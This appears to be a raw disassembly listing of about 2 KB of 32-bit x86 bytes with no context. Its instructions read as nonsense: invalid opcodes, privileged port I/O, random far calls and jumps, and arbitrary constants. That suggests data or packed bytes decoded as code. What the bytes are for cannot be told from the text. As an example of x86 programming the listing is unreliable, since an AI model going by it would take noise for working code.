  411104:	or     BYTE PTR [edx],ch
  411106:	mov    dl,0x2e
  411108:	std    
  411109:	dec    ecx
  41110a:	loopne 0x41114f
  41110c:	aad    0x8d
  41110e:	pop    ds
  41110f:	call   0xa226:0xfb2251d6
  411116:	std    
  411117:	pop    ss
  411118:	in     eax,dx
  411119:	ins    BYTE PTR es:[edi],dx
  41111a:	xlat   BYTE PTR ds:[ebx]
  41111b:	in     al,dx
  41111c:	mov    dl,0x27
  41111e:	iret   
  41111f:	clc    
  411120:	mov    dl,0x67
  411122:	jmp    0x411171
  411124:	push   es
  411125:	push   cs
  411126:	int    0x6b
  411128:	imul   ebp,DWORD PTR [eax],0xcf90ff4a
  41112e:	out    0x85,eax
  411130:	std    
  411131:	adc    al,0xfb
  411133:	cmp    ch,BYTE PTR [edi+edx*8]
  411136:	jno    0x41119c
  411138:	mov    eax,ds:0xa786e9b3
  41113d:	out    0xd0,eax
  41113f:	cmc    
  411140:	rol    dh,1
  411142:	sbb    ch,ch
  411144:	out    0x5b,al
  411146:	cs in  al,dx
  411148:	push   ds
  411149:	jno    0x4110d1
  41114b:	in     eax,0xe
  41114d:	pop    DWORD PTR [edi+0x37]
  411150:	jmp    0x91a6:0x2e385e32
  411157:	xchg   ebp,eax
  411158:	push   ds
  411159:	and    eax,0x1739d820
  41115e:	pop    ebp
  41115f:	sub    al,0xf4
  411161:	jmp    0x7205:0x717210a2
  411168:	cmc    
  411169:	cmp    dl,ah
  41116b:	add    al,0x73
  41116d:	loope  0x4110f9
  41116f:	mov    ds:0x9ea993fd,al
  411174:	and    BYTE PTR [ebp-0x32fd3a17],ch
  41117a:	adc    al,0x84
  41117c:	div    BYTE PTR [eax+0x6e]
  41117f:	dec    edi
  411180:	xchg   edi,eax
  411181:	inc    eax
  411182:	prefetcht0 BYTE PTR [edi-0x78]
  411186:	cmc    
  411187:	mov    bh,0x14
  411189:	add    BYTE PTR [edi+0x1e8d34d0],dh
  41118f:	imul   ebx,DWORD PTR [edi],0xf54b08a1
  411195:	stos   DWORD PTR es:[edi],eax
  411196:	push   cs
  411197:	xchg   DWORD PTR [edx+ecx*1],ebp
  41119a:	pop    ecx
  41119b:	cdq    
  41119c:	rcr    DWORD PTR [esi+0x1d591ecf],1
  4111a2:	fadd   st(4),st
  4111a4:	xor    al,0x2a
  4111a6:	xchg   edi,eax
  4111a7:	(bad)  
  4111a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111a9:	repz mov esp,0x3aec25ae
  4111af:	mov    ecx,0x78aa2d35
  4111b4:	sbb    bh,al
  4111b6:	rol    BYTE PTR [ecx+0x6bc085c2],cl
  4111bc:	cmp    BYTE PTR [ebx],al
  4111be:	and    bl,dl
  4111c0:	sub    al,0x5c
  4111c2:	or     dl,BYTE PTR [ebp+0x62d127f9]
  4111c8:	pop    ebp
  4111c9:	adc    dh,bl
  4111cb:	inc    eax
  4111cc:	in     eax,0xd8
  4111ce:	sbb    eax,0xeba6d170
  4111d3:	in     eax,0x8c
  4111d5:	pop    ss
  4111d6:	add    eax,0xbd30d729
  4111db:	outs   dx,DWORD PTR ds:[esi]
  4111dc:	push   ecx
  4111dd:	lods   al,BYTE PTR ds:[esi]
  4111de:	ja     0x4111da
  4111e0:	mov    ds:0x7cc64fe5,eax
  4111e5:	pop    es
  4111e6:	push   esp
  4111e7:	mov    dl,0xc1
  4111e9:	push   0x7
  4111eb:	int3   
  4111ec:	(bad)  
  4111ed:	and    eax,0xbc2910e0
  4111f2:	fisub  WORD PTR [eax-0x53]
  4111f5:	js     0x411219
  4111f7:	jmp    0xeb2:0xb1015ddd
  4111fe:	inc    esi
  4111ff:	xor    DWORD PTR [ecx-0x7849b1d1],0x4877b81
  411209:	push   esp
  41120a:	cmc    
  41120b:	cmp    DWORD PTR [esi+0x68879d84],0xae79e45
  411215:	xchg   bl,dh
  411217:	rcr    dl,cl
  411219:	inc    edx
  41121a:	push   ss
  41121b:	loop   0x4111a1
  41121d:	test   al,0xe6
  41121f:	mov    esp,0x64bb40d1
  411224:	iret   
  411225:	iret   
  411226:	add    cl,bh
  411228:	repnz ss popf 
  41122b:	test   eax,0xff49602e
  411230:	aas    
  411231:	jns    0x41120f
  411233:	in     al,0x8
  411235:	es iret 
  411237:	test   al,bl
  411239:	or     ecx,DWORD PTR [ebp+esi*4-0x5c15318]
  411240:	cmp    eax,DWORD PTR [edi]
  411242:	mov    ecx,?
  411244:	push   esp
  411245:	adc    BYTE PTR [esi-0x34b2c50d],al
  41124b:	mov    ds:0x638ae4ef,eax
  411250:	push   eax
  411251:	xchg   ebp,eax
  411252:	mov    ebx,0x2013884d
  411257:	ss mov cl,0x0
  41125a:	mov    al,ds:0xc9f929dd
  41125f:	push   cs
  411260:	bndstx [ebx],bnd3
  411263:	or     al,0x30
  411265:	dec    esi
  411266:	(bad)  
  411267:	jb     0x411223
  411269:	popa   
  41126a:	mov    BYTE PTR [edx+0x3c],dl
  41126d:	mov    edx,0xc95ef2e8
  411272:	xchg   edx,eax
  411273:	mov    cl,0x22
  411275:	loope  0x4112ba
  411277:	xor    esi,0x29
  41127a:	sub    al,0x9c
  41127c:	outs   dx,BYTE PTR ds:[esi]
  41127d:	cmp    ebp,ebp
  41127f:	jecxz  0x41121b
  411281:	loop   0x411261
  411283:	xor    DWORD PTR [edx+0x5dc6acea],0x13
  41128a:	mov    dh,BYTE PTR ds:0x4e5dcb25
  411290:	cld    
  411291:	mov    dh,0xa0
  411293:	dec    eax
  411294:	push   es
  411295:	adc    BYTE PTR [edx],bh
  411297:	outs   dx,BYTE PTR ds:[esi]
  411298:	add    dh,BYTE PTR [edi-0x43]
  41129b:	dec    ecx
  41129c:	adc    eax,0xe6c4c592
  4112a1:	adc    BYTE PTR [esi+0x44],bh
  4112a4:	mov    ch,0xca
  4112a6:	push   0xffffffc1
  4112a8:	repz push ebx
  4112aa:	gs call 0x2f40:0x65adad2e
  4112b2:	retf   
  4112b3:	test   al,0x2
  4112b5:	xor    al,BYTE PTR ds:0x69dba611
  4112bb:	ret    0x4caa
  4112be:	dec    eax
  4112bf:	cli    
  4112c0:	mov    bl,0xd2
  4112c2:	rol    DWORD PTR [ecx+ebp*2-0x6a592da9],cl
  4112c9:	dec    edx
  4112ca:	xor    ebx,ebx
  4112cc:	sub    cl,ch
  4112ce:	sub    edx,DWORD PTR [ecx]
  4112d0:	lods   eax,DWORD PTR ds:[esi]
  4112d1:	out    0xaa,al
  4112d3:	dec    esi
  4112d4:	jae    0x4112b0
  4112d6:	or     DWORD PTR [ebx],ecx
  4112d8:	pop    ecx
  4112d9:	cmp    al,0x46
  4112db:	stos   BYTE PTR es:[edi],al
  4112dc:	out    dx,al
  4112dd:	jno    0x4112bd
  4112df:	mov    ds:0xb7a8cf3,eax
  4112e4:	mov    eax,0x9d13a91a
  4112e9:	inc    ecx
  4112ea:	repz jno 0x41128c
  4112ed:	sar    DWORD PTR [ebx+0x55e1528a],1
  4112f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112f4:	sbb    ah,al
  4112f6:	sbb    eax,0x4f529ab4
  4112fb:	dec    eax
  4112fc:	shl    ecx,0x85
  4112ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411300:	sub    eax,0x8816da1e
  411305:	add    eax,0x258b2cf5
  41130a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41130b:	or     BYTE PTR ds:0xcb0cbafb,cl
  411311:	jno    0x411308
  411313:	xor    al,0xee
  411315:	imul   edi,DWORD PTR [ecx+esi*8+0x5c],0xffffffd7
  41131a:	jns    0x411383
  41131c:	int    0x63
  41131e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41131f:	pxor   mm0,QWORD PTR [eax]
  411322:	jmp    0x673f3388
  411327:	jmp    0x81b534ce
  41132c:	mov    ds:0x572b169f,eax
  411331:	push   ss
  411332:	shl    DWORD PTR [esi-0x57],1
  411335:	out    0x9a,eax
  411337:	mov    ch,0xc3
  411339:	push   ecx
  41133a:	test   DWORD PTR [edi+esi*1-0x388a80b9],edx
  411341:	ins    BYTE PTR es:[edi],dx
  411342:	jg     0x4113a8
  411344:	pop    es
  411345:	xchg   ecx,eax
  411346:	cmp    esi,esp
  411348:	(bad)  
  411349:	call   0x1a9a1d38
  41134e:	jb     0x4113ac
  411350:	pop    edi
  411351:	or     eax,0x6b360b0c
  411356:	mov    edx,DWORD PTR [edi]
  411358:	lods   al,BYTE PTR ds:[esi]
  411359:	in     eax,0x58
  41135b:	dec    esp
  41135c:	mov    ah,0xb7
  41135e:	clc    
  41135f:	sub    BYTE PTR ds:0x8ca89230,ch
  411365:	shr    DWORD PTR [edx-0x786927bf],cl
  41136b:	cmp    eax,0x75ac3e12
  411370:	adc    eax,0xfa2b2d80
  411375:	inc    eax
  411376:	int    0x3
  411378:	hlt    
  411379:	and    al,BYTE PTR [edi]
  41137b:	out    dx,al
  41137c:	lea    edi,[edx]
  41137e:	pop    es
  41137f:	jne    0x41131c
  411381:	shr    BYTE PTR [edi-0x5f161b6c],1
  411387:	inc    ebp
  411388:	data16 and dl,BYTE PTR ds:0xd5653f13
  41138f:	xchg   DWORD PTR [ecx+0x130c85b1],edi
  411395:	pop    ss
  411396:	push   edi
  411397:	cmc    
  411398:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411399:	mov    ah,0x66
  41139b:	inc    ebp
  41139c:	jnp    0x4113a3
  41139e:	ins    DWORD PTR es:[edi],dx
  41139f:	sbb    eax,0x7d0583d
  4113a4:	stos   DWORD PTR es:[edi],eax
  4113a5:	xlat   BYTE PTR ds:[ebx]
  4113a6:	adc    BYTE PTR [edx+0x3],ch
  4113a9:	lods   al,BYTE PTR ds:[esi]
  4113aa:	mov    eax,0x51219a8f
  4113af:	scas   eax,DWORD PTR es:[edi]
  4113b0:	sub    edx,DWORD PTR [esi-0x76]
  4113b3:	add    BYTE PTR [ebx],0xe5
  4113b6:	ins    BYTE PTR es:[edi],dx
  4113b7:	jmp    0x411360
  4113b9:	test   DWORD PTR [esi-0x6db2733f],ecx
  4113bf:	pop    ss
  4113c0:	push   0xb7932025
  4113c5:	jo     0x411444
  4113c7:	sbb    BYTE PTR ds:0x3cf8e9ca,bl
  4113cd:	ds retf 
  4113cf:	or     cl,ah
  4113d1:	in     al,dx
  4113d2:	sbb    BYTE PTR ss:[edx],dh
  4113d5:	inc    edi
  4113d6:	and    DWORD PTR [edx+0x71801bb7],edi
  4113dc:	and    dl,BYTE PTR [ecx]
  4113de:	call   0x2e234a0a
  4113e3:	inc    edx
  4113e4:	push   esp
  4113e5:	pop    ebx
  4113e6:	rcr    BYTE PTR [ebp-0x6c],1
  4113e9:	pusha  
  4113ea:	cmp    BYTE PTR [edi-0x3ded4bad],ah
  4113f0:	or     al,0x19
  4113f2:	lea    eax,[eax]
  4113f4:	mov    eax,0x68a0d986
  4113f9:	mov    es,ecx
  4113fb:	mov    ebx,0xae900987
  411400:	fimul  DWORD PTR [eax]
  411402:	ficomp WORD PTR [esi+0x3a5cb395]
  411408:	push   es
  411409:	sbb    eax,0xa3c72a0a
  41140e:	jns    0x41147c
  411410:	xor    ebp,esp
  411412:	cmc    
  411413:	mov    eax,0x278fccf3
  411418:	mov    al,ds:0x13b369d9
  41141d:	scas   al,BYTE PTR es:[edi]
  41141e:	nop    DWORD PTR [edi-0x1]
  411422:	ins    DWORD PTR es:[edi],dx
  411423:	push   ds
  411424:	sbb    ecx,ecx
  411426:	in     eax,dx
  411427:	sub    ecx,eax
  411429:	push   ds
  41142a:	leave  
  41142b:	mov    eax,0x6acc820b
  411430:	mov    eax,fs
  411432:	inc    edx
  411433:	jns    0x411493
  411435:	or     esp,eax
  411437:	or     DWORD PTR [edi+0x3b03b2b5],esi
  41143d:	jl     0x4113d2
  41143f:	xor    eax,0x31576f03
  411444:	mov    BYTE PTR [edx+esi*8-0x29b6fd1b],cl
  41144b:	pop    ebp
  41144c:	sub    dh,bh
  41144e:	addr16 pop ds
  411450:	scas   eax,DWORD PTR es:[edi]
  411451:	push   esi
  411452:	(bad)  
  411454:	scas   eax,DWORD PTR es:[edi]
  411455:	jl     0x41148d
  411457:	inc    edx
  411458:	loop   0x411496
  41145a:	push   esp
  41145b:	int    0x40
  41145d:	es addr16 in al,0xc1
  411461:	push   0xc
  411463:	clc    
  411464:	leave  
  411465:	xor    BYTE PTR [edx],0x86
  411468:	mov    ecx,0xcd04168f
  41146d:	ss aaa 
  41146f:	lds    ebx,FWORD PTR [ebx-0x8]
  411472:	es jge 0x411416
  411475:	sbb    BYTE PTR [edi-0xb],bl
  411478:	jp     0x411499
  41147a:	push   0x24
  41147c:	jmp    0x411497
  41147e:	sub    al,0x60
  411480:	add    bh,BYTE PTR [ebx-0x50]
  411483:	add    edx,0xa566d461
  411489:	mov    al,0x64
  41148b:	or     al,bh
  41148d:	adc    al,0x53
  41148f:	mov    edi,DWORD PTR [edx+0x580137b1]
  411495:	gs nop
  411497:	xchg   ebx,eax
  411498:	mov    ch,0xd9
  41149a:	mov    edx,0x960650f0
  41149f:	ins    BYTE PTR es:[edi],dx
  4114a0:	in     eax,dx
  4114a1:	call   0x2b27:0xb4396f88
  4114a8:	sub    esp,DWORD PTR [edi-0x4b2a13e0]
  4114ae:	sbb    al,0xe1
  4114b0:	cmp    al,0x6b
  4114b2:	loopne 0x411460
  4114b4:	es call 0x801c07cd
  4114ba:	mul    BYTE PTR [edx]
  4114bc:	adc    eax,0x8bd00788
  4114c1:	pop    es
  4114c2:	gs inc ecx
  4114c4:	lock sub DWORD PTR [ecx+0x5],ecx
  4114c8:	out    dx,al
  4114c9:	ret    
  4114ca:	pop    ecx
  4114cb:	cmp    DWORD PTR [edi+0x71],esp
  4114ce:	call   0x9ed6:0xadfa6b57
  4114d5:	js     0x4114ab
  4114d7:	push   edx
  4114d8:	xchg   esp,eax
  4114d9:	push   ecx
  4114da:	and    BYTE PTR [eax-0x26f4123d],bh
  4114e0:	adc    ch,dh
  4114e2:	jle    0x411553
  4114e4:	rcl    BYTE PTR [ebx],0x48
  4114e7:	leave  
  4114e8:	sbb    DWORD PTR [edi+0x67beb9e1],edx
  4114ee:	outs   dx,BYTE PTR ds:[esi]
  4114ef:	xor    DWORD PTR [eax-0x1e],esp
  4114f2:	pop    edx
  4114f3:	xor    dh,BYTE PTR [ebx]
  4114f5:	mov    eax,0x856268c9
  4114fa:	shl    BYTE PTR [esi+eax*4-0x27],cl
  4114fe:	or     BYTE PTR [edx],0x4
  411501:	jae    0x41157a
  411503:	(bad)  [esi]
  411505:	div    DWORD PTR ds:0xb3afadb1
  41150b:	push   0x3e8b3c28
  411510:	loopne 0x4114b2
  411512:	fs xor eax,0x56b7a8e
  411518:	sbb    ebp,DWORD PTR [edi-0x29]
  41151b:	sub    ecx,ebp
  41151d:	hlt    
  41151e:	inc    eax
  41151f:	and    esp,DWORD PTR [eax+edx*8]
  411522:	mov    dl,0xdd
  411524:	mov    fs,WORD PTR [ecx]
  411526:	fidiv  DWORD PTR [ebx-0x37]
  411529:	popa   
  41152a:	xor    DWORD PTR [esp+eax*1+0x72f77627],0xf
  411532:	stos   BYTE PTR es:[edi],al
  411533:	call   0x63b9b0f0
  411538:	cmp    BYTE PTR [edx-0x2784190c],ch
  41153e:	xlat   BYTE PTR ds:[ebx]
  41153f:	xlat   BYTE PTR ds:[ebx]
  411540:	sar    BYTE PTR [esi+0x19e67a4c],0xac
  411547:	loopne 0x4115b2
  411549:	adc    al,0xf4
  41154b:	sub    al,0xba
  41154d:	imul   esi,DWORD PTR ds:[edx-0x304cd67f],0xa44d548d
  411558:	lahf   
  411559:	xor    eax,0x7418e870
  41155e:	les    edi,FWORD PTR [esi]
  411560:	dec    esi
  411561:	addr16 dec edx
  411563:	push   es
  411564:	and    al,0x3f
  411566:	out    0x87,al
  411568:	push   0x260a738d
  41156d:	jle    0x411526
  41156f:	fistp  DWORD PTR [edx]
  411571:	xor    al,0xf0
  411573:	out    dx,eax
  411574:	add    DWORD PTR [eax],eax
  411576:	mov    al,ds:0xde9e4862
  41157b:	mov    bl,0x7f
  41157d:	test   DWORD PTR [eax-0x2e877399],0x662bb208
  411587:	ret    0x28dc
  41158a:	(bad)  
  41158b:	lods   al,BYTE PTR ds:[esi]
  41158c:	sub    al,0xb
  41158e:	jp     0x4115c2
  411590:	jo     0x4115d6
  411592:	out    0x52,eax
  411594:	call   0x36c24659
  411599:	ds add eax,0x19a694f8
  41159f:	dec    esi
  4115a0:	mov    al,ds:0x88b15bef
  4115a5:	xor    al,0x2d
  4115a7:	inc    edi
  4115a8:	repnz mov bh,ch
  4115ab:	or     al,0x3b
  4115ad:	mov    al,ds:0x2ce73222
  4115b2:	and    eax,0x7563bc1f
  4115b7:	jnp    0x41155e
  4115b9:	mov    ebx,es
  4115bb:	aad    0x71
  4115bd:	cli    
  4115be:	mov    bh,0x7
  4115c0:	inc    ebp
  4115c1:	mov    ss,ecx
  4115c3:	cmp    al,0x39
  4115c5:	mov    eax,0x3fa8e7d2
  4115ca:	cld    
  4115cb:	mov    cl,BYTE PTR [ebx-0x5]
  4115ce:	cmp    BYTE PTR [edx+0x498fdbd8],dh
  4115d4:	inc    esp
  4115d5:	test   eax,0xdac5397c
  4115da:	sbb    bl,dl
  4115dc:	ss mov edi,0xdea8b96c
  4115e2:	pop    edx
  4115e3:	sbb    DWORD PTR [ebx],edx
  4115e5:	cdq    
  4115e6:	mov    eax,0x1e1fafae
  4115eb:	and    eax,0xb1d2b234
  4115f0:	sub    eax,0xd0add0a0
  4115f5:	sbb    eax,0x46264409
  4115fa:	sub    DWORD PTR [edx],ebp
  4115fc:	mov    bh,0x61
  4115fe:	or     ch,BYTE PTR [edx]
  411600:	mov    ah,0x36
  411602:	mov    ds:0xb94315c,al
  411607:	jl     0x41165d
  411609:	pop    ecx
  41160a:	cmp    al,0x8c
  41160c:	mov    dh,BYTE PTR [edx+edi*1]
  41160f:	lods   eax,DWORD PTR ds:[esi]
  411610:	and    eax,0xd54ad741
  411615:	das    
  411616:	xor    BYTE PTR [edi+0x39],bl
  411619:	ror    DWORD PTR [eax],cl
  41161b:	xchg   DWORD PTR [edi+0x66],eax
  41161e:	adc    edx,DWORD PTR [ecx+eax*2+0x7f481415]
  411625:	imul   edi,DWORD PTR [ecx+0x37],0x54
  411629:	jmp    0xec79:0x2ab3e95b
  411630:	adc    BYTE PTR [edi+0x2f574bd7],dh
  411636:	and    al,bl
  411638:	pop    ss
  411639:	xchg   ebp,eax
  41163a:	add    eax,0x426af928
  41163f:	lahf   
  411640:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  411642:	cmp    ebx,DWORD PTR [edi-0x7074c7e4]
  411648:	test   ebp,eax
  41164a:	(bad)  
  41164b:	cmp    eax,0x4374428f
  411650:	ins    DWORD PTR es:[edi],dx
  411651:	mov    WORD PTR [edx+0x464ff240],es
  411657:	xchg   ebp,eax
  411658:	loope  0x411635
  41165a:	jmp    0x4116af
  41165c:	mov    cl,ah
  41165e:	pop    edx
  41165f:	dec    ebp
  411660:	in     eax,dx
  411661:	fwait
  411662:	shr    DWORD PTR [eax],cl
  411664:	add    al,0xa2
  411666:	sbb    edx,DWORD PTR [ebx]
  411668:	push   esi
  411669:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41166b:	xor    al,0x4
  41166d:	mov    dh,0x16
  411670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411671:	xchg   edi,eax
  411672:	fldenv [edi+0x6c136d45]
  411678:	pop    eax
  411679:	fs sahf 
  41167b:	out    0xdc,al
  41167d:	sbb    bh,BYTE PTR [edx+0x5b]
  411680:	jg     0x41163c
  411682:	lea    ebp,[ebx-0x708a5ad]
  411688:	mov    ecx,0x255225b4
  41168d:	sub    eax,DWORD PTR [ecx]
  41168f:	dec    esp
  411690:	int    0x2f
  411692:	iret   
  411693:	mov    edx,0x49ae7814
  411698:	in     eax,0x72
  41169a:	jmp    0xbffa8e3
  41169f:	es in  al,dx
  4116a1:	arpl   WORD PTR [esi+0x7],si
  4116a4:	mov    esp,0xfa2ef8a3
  4116a9:	fs fwait
  4116ab:	mov    WORD PTR [ebx+0x5f0544e1],es
  4116b1:	mov    ds:0x4c60659a,eax
  4116b6:	mov    esi,0x2c0a64b
  4116bb:	fs repz mov dl,0xe1
  4116bf:	push   ds
  4116c0:	lods   eax,DWORD PTR ds:[esi]
  4116c1:	and    esp,DWORD PTR [ebx+0x4a5afae]
  4116c7:	mov    eax,0xe585c98b
  4116cc:	inc    ebx
  4116cd:	xchg   BYTE PTR [edi-0x6b2b19f0],cl
  4116d3:	ss or  al,0x82
  4116d6:	xchg   esp,eax
  4116d7:	adc    BYTE PTR [edi+eiz*4],dl
  4116da:	pop    ebp
  4116db:	and    ah,BYTE PTR ds:0x83567268
  4116e1:	gs mov esp,0x9ac9af98
  4116e7:	es inc ebp
  4116e9:	sbb    eax,DWORD PTR [esi]
  4116eb:	les    eax,FWORD PTR [edx+0x4e552822]
  4116f1:	fld    TBYTE PTR [esi+0x2d]
  4116f4:	test   DWORD PTR [ecx],esi
  4116f6:	inc    eax
  4116f7:	push   edi
  4116f8:	mov    al,BYTE PTR [ebx-0x6d52706e]
  4116fe:	sahf   
  4116ff:	sbb    dh,BYTE PTR [ebx+0x58]
  411702:	pop    ebp
  411703:	dec    ecx
  411704:	push   di
  411706:	cli    
  411707:	inc    ebx
  411708:	iret   
  411709:	add    eax,0xce375f93
  41170e:	sbb    eax,0x77ca77e2
  411713:	jae    0x411733
  411715:	mov    esp,0xa1fb21fd
  41171a:	nop
  41171b:	out    0x2b,al
  41171d:	jnp    0x411748
  41171f:	sbb    ch,al
  411721:	inc    ah
  411723:	adc    al,0xd2
  411725:	push   esp
  411726:	aas    
  411727:	pop    ds
  411728:	mov    ecx,0xf584ad4
  41172d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41172e:	inc    BYTE PTR [ebp+ebx*2-0x60]
  411732:	mov    ds:0x400738b2,al
  411737:	sar    DWORD PTR [esi-0x3939108],cl
  41173d:	fsub   QWORD PTR [ebp-0x46043c21]
  411743:	out    dx,al
  411744:	ins    BYTE PTR es:[edi],dx
  411745:	or     BYTE PTR [edx+eax*4+0x65],cl
  411749:	jbe    0x4117ab
  41174b:	dec    esp
  41174c:	(bad)  
  41174d:	fucomip st,st(0)
  41174f:	adc    bh,0x6
  411752:	adc    eax,0xb36b6f86
  411757:	xchg   esi,eax
  411758:	and    BYTE PTR [esi-0x19],dh
  41175b:	jb     0x411737
  41175d:	prefetcht1 BYTE PTR [edx]
  411760:	push   edi
  411761:	js     0x4117ac
  411763:	jge    0x4117e2
  411765:	adc    ebp,DWORD PTR [esi]
  411767:	call   0x202d347c
  41176c:	rcl    DWORD PTR [edx],1
  41176e:	lods   eax,DWORD PTR ds:[esi]
  41176f:	mov    ds:0x54e7cb22,al
  411774:	pushf  
  411775:	sub    DWORD PTR [ecx+ebx*4+0x22],esp
  411779:	mov    esi,0x7c108c6
  41177e:	inc    eax
  41177f:	cld    
  411780:	dec    esp
  411781:	lds    ebp,FWORD PTR [edx-0x3e]
  411784:	iret   
  411785:	sub    BYTE PTR [ecx+0x51],bl
  411788:	jno    0x411713
  41178a:	in     al,0x38
  41178c:	div    BYTE PTR [ebx-0x79]
  41178f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411790:	int    0xec
  411792:	pop    ss
  411793:	js     0x41171b
  411795:	fs xchg esi,eax
  411797:	jle    0x41175a
  411799:	jne    0x41180d
  41179b:	leave  
  41179c:	pop    edi
  41179d:	mov    ebp,0x132d89f3
  4117a2:	mov    bh,0xaa
  4117a4:	mov    DWORD PTR [esi+0x39],ebx
  4117a7:	clc    
  4117a8:	sti    
  4117a9:	rol    BYTE PTR [esi+0x44a9cf4b],cl
  4117af:	iret   
  4117b0:	fist   DWORD PTR [ebx+ebx*4]
  4117b3:	test   eax,0x330dff09
  4117b8:	cmc    
  4117b9:	fwait
  4117ba:	pop    edx
  4117bb:	xor    DWORD PTR [ebx+0x1502d722],esp
  4117c1:	into   
  4117c2:	mov    ah,0x10
  4117c4:	mov    esp,0xd6edd809
  4117c9:	arpl   WORD PTR cs:[ebp-0xdfd3495],bp
  4117d0:	dec    edx
  4117d1:	inc    esp
  4117d2:	(bad)  
  4117d4:	pop    esi
  4117d5:	dec    esi
  4117d6:	call   0xceda:0x962c654
  4117dd:	rcr    DWORD PTR [ebp-0x73],1
  4117e0:	fiadd  WORD PTR [ecx+0x6fda0452]
  4117e6:	and    DWORD PTR [ecx],ebp
  4117e8:	shl    BYTE PTR [edx+0x1112f7cc],cl
  4117ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117ef:	pop    esp
  4117f0:	pop    edi
  4117f1:	ins    DWORD PTR es:[edi],dx
  4117f2:	xchg   BYTE PTR ds:[ebx],al
  4117f5:	xor    BYTE PTR [edx],ch
  4117f7:	adc    ebx,ebp
  4117f9:	jo     0x4117ed
  4117fb:	repnz sub eax,0x248664c1
  411801:	cwde   
  411802:	ret    0x4f3f
  411805:	xchg   ecx,eax
  411806:	enter  0x58bc,0xa
  41180a:	js     0x41181f
  41180c:	mov    esp,0x718bb7d1
  411811:	sub    eax,DWORD PTR [esi-0x1]
  411814:	popa   
  411815:	jge    0x41187d
  411817:	xchg   ecx,eax
  411818:	mov    ss,WORD PTR [eax]
  41181a:	push   0xffffffb5
  41181c:	popf   
  41181d:	jecxz  0x4117be
  41181f:	aaa    
  411820:	adc    DWORD PTR [esi],0xe711fb76
  411826:	push   edx
  411827:	xchg   esp,eax
  411828:	ja     0x4118a5
  41182a:	daa    
  41182b:	jmp    0x36c6:0x5e1cd2b0
  411832:	adc    esp,DWORD PTR [esi-0x31]
  411835:	mov    dl,0xb
  411837:	xchg   ebp,eax
  411838:	out    dx,eax
  411839:	mov    edi,0x9de77e79
  41183e:	cmp    ebp,DWORD PTR [esi+0x5b]
  411841:	imul   esp,DWORD PTR [ebp-0x6632d859],0x959570cd
  41184b:	adc    DWORD PTR [edx-0x9d8f3d4],esp
  411851:	cmp    eax,0x6f813cef
  411856:	pop    edx
  411857:	pop    ebx
  411858:	pop    ecx
  411859:	and    BYTE PTR [edx+0x25114374],dh
  41185f:	mov    ?,WORD PTR ds:0x3da37717
  411865:	mov    ?,esp
  411867:	loop   0x41189f
  411869:	sbb    edi,DWORD PTR [edi-0x60b4f2fb]
  41186f:	lods   al,BYTE PTR ds:[esi]
  411870:	data16 hlt 
  411872:	push   0xffffff95
  411874:	outs   dx,DWORD PTR ds:[esi]
  411875:	loop   0x411831
  411877:	xchg   esi,eax
  411878:	sub    BYTE PTR [edi-0x4619bc1e],dl
  41187e:	cld    
  41187f:	xchg   BYTE PTR [eax+ecx*4],bh
  411882:	dec    esi
  411883:	stos   BYTE PTR es:[edi],al
  411884:	(bad)  
  411885:	std    
  411886:	jns    0x4118c4
  411888:	not    DWORD PTR [esi-0x74eabbdd]
  41188e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41188f:	test   al,0x7d
  411891:	jae    0x411861
  411893:	arpl   WORD PTR [ebp-0x77],di
  411896:	test   ah,bl
  411898:	(bad)  
  411899:	aad    0xe2
  41189b:	jge    0x411838
  41189d:	mov    WORD PTR [ebp+0x1a99339d],?
  4118a3:	enter  0x7f99,0xaf
  4118a7:	mul    DWORD PTR [eax-0x1e]
  4118aa:	inc    ecx
  4118ab:	mov    bh,0x75
  4118ad:	pop    ecx
  4118ae:	jnp    0x4118aa
  4118b0:	jl     0x411898
  4118b2:	int3   
  4118b3:	add    edi,DWORD PTR [ecx+eax*8-0x7038f3b4]
  4118ba:	lahf   
  4118bb:	imul   edi,DWORD PTR [ecx],0xffffffde
  4118be:	in     eax,0x4e
  4118c0:	sbb    ch,ah
  4118c2:	pushf  
  4118c3:	pop    ss
  4118c4:	scas   eax,DWORD PTR es:[edi]
  4118c5:	addr16 in eax,dx
  4118c7:	adc    eax,0x5a4cbb8d
  4118cc:	sbb    eax,0x72f270a4
  4118d1:	aas    
  4118d2:	mov    bl,0x9a
  4118d4:	jno    0x4118f3
  4118d6:	sbb    dh,ch
  4118d8:	in     al,dx
  4118d9:	inc    ebp
  4118da:	pop    eax
  4118db:	int    0xff
  4118dd:	lahf   
  4118de:	add    BYTE PTR [edx],bl
  4118e0:	test   ah,dh
  4118e2:	data16 cld 
  4118e4:	xlat   BYTE PTR gs:[ebx]
  4118e6:	push   cs
  4118e7:	in     al,dx
  4118e8:	sub    bl,BYTE PTR [eax]
  4118ea:	and    ebp,ebx
  4118ec:	fidivr WORD PTR [eax]
  4118ee:	or     eax,0xcd2d9b41
  4118f3:	fcomp  DWORD PTR [ecx]
  4118f5:	pop    esp
  4118f6:	call   0x2441:0x4969ab0b
  4118fd:	mov    al,0x14
  4118ff:	mov    esi,0x1d2c4623
  411904:	mov    es,ebp
  411906:	sub    BYTE PTR [ebp+0x1f],cl
  411909:	inc    edx
  41190a:	cmp    al,bh
  41190c:	cwde   
  41190d:	rol    BYTE PTR [edi],0x94
  411910:	push   ebp
  411911:	aam    0x56
  411913:	add    BYTE PTR [eax-0x54c2e12e],bh
  411919:	ret    0x27d6
  41191c:	jns    0x41192d
  41191e:	jecxz  0x411925
  411920:	inc    ebx
  411921:	imul   eax,DWORD PTR [edx+0x791b5a9a],0xffffffc9
  411928:	bound  ebx,QWORD PTR [edx+eiz*8-0x473bb722]
  41192f:	dec    esi
  411930:	fiadd  WORD PTR ds:0x81a2247d
  411936:	dec    esi
  411937:	inc    edx
  411938:	jl     0x41199d
  41193a:	mov    al,BYTE PTR [eax-0x62]
